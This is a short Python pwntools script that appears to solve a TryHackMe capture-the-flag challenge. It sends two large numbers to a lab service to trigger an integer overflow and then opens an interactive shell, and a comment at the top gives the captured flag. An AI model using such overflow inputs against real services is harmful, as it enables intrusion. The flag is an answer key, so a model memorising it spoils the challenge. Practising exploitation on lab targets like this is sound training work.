#THM{VerY_b4D_1n73G3rsss}
from pwn import *

host  = '10.10.176.67' 
port = 9005
exe = 'pwn105-1644300421555.pwn105'
elf = ELF(exe)
context.binary = elf
p = remote(host, port)

# p = process(exe)
nb1 = b'117283948782' 
nb2 = b'117283948782'
p.recvuntil(b"]>> ")
p.sendline(nb1)
p.recvuntil(b"]>> ")
p.sendline(nb2)


p.interactive()
